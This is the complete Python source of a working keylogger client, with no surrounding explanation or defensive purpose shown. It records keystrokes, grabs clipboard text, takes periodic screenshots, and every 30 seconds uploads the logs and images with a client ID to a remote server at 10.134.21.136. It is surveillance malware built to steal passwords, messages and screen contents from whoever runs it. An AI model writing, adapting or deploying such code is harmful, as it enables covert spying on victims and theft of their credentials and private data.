import os
import time
import uuid
import threading
import requests
import pyperclip
from pynput import keyboard
from PIL import ImageGrab

SERVER_URL = "http://10.134.21.136/upload"
CLIENT_ID = str(uuid.uuid4())
LOG_FILE = "keylog.txt"
INTERVAL = 30  # seconds

# Keys we want to ignore completely
IGNORE_KEYS = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.cmd, keyboard.Key.cmd_r,
    keyboard.Key.esc
}

def log_keystroke(key):
    """Capture keystrokes and save them to file (filtered)."""
    try:
        if key in IGNORE_KEYS:
            return  # skip modifier keys

        if hasattr(key, "char") and key.char is not None:
            # Normal characters
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(key.char)
        else:
            # Handle special keys in readable form
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BACKSPACE]",
            }
            if key in special_keys:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(special_keys[key])

    except Exception as e:
        print(f"[!] Error logging keystroke: {e}")

def is_code_snippet(text: str) -> bool:
    """Detect if clipboard text looks like code."""
    code_indicators = ["import ", "def ", "class ", "{", "}", ";", "from ", "=", "(", ")"]
    if "\n" in text:  # multi-line = likely code
        return True
    for kw in code_indicators:
        if kw in text:
            return True
    return False

def capture_clipboard():
    """Capture clipboard text if available & not code."""
    try:
        text = pyperclip.paste()
        if text and not is_code_snippet(text):
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n[Clipboard]: {text}\n")
    except Exception:
        pass

def take_screenshot():
    """Take a screenshot and save to file"""
    try:
        image = ImageGrab.grab()
        image.save("screenshot.png")
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")

def send_data():
    """Send logs + screenshot to the server periodically"""
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_data = f.read()

            files = {}
            if os.path.exists("screenshot.png"):
                files["screenshot"] = open("screenshot.png", "rb")

            try:
                requests.post(
                    SERVER_URL,
                    data={"client_id": CLIENT_ID, "log": log_data},
                    files=files,
                    timeout=10
                )
                print("[+] Data sent to server")
            except Exception as e:
                print(f"[!] Failed to send data: {e}")

            # Clear log file
            open(LOG_FILE, "w").close()

        take_screenshot()
        capture_clipboard()
        time.sleep(INTERVAL)

def start_keylogger():
    listener = keyboard.Listener(on_press=log_keystroke)
    listener.start()

if __name__ == "__main__":
    print("[*] Client started. Sending logs every", INTERVAL, "seconds...")
    threading.Thread(target=send_data, daemon=True).start()
    start_keylogger()
    while True:
        time.sleep(10)
